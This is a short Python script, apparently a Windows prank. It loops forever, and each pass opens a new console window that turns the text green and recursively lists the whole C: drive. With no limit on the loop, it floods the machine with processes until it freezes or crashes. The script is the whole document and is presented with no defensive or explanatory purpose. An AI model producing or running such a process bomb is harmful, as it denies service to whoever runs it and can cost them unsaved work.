import subprocess

if __name__ == "__main__":
    while True:
        subprocess.Popen(r'cmd /k color 2 && dir/s C:\"',creationflags=subprocess.CREATE_NEW_CONSOLE)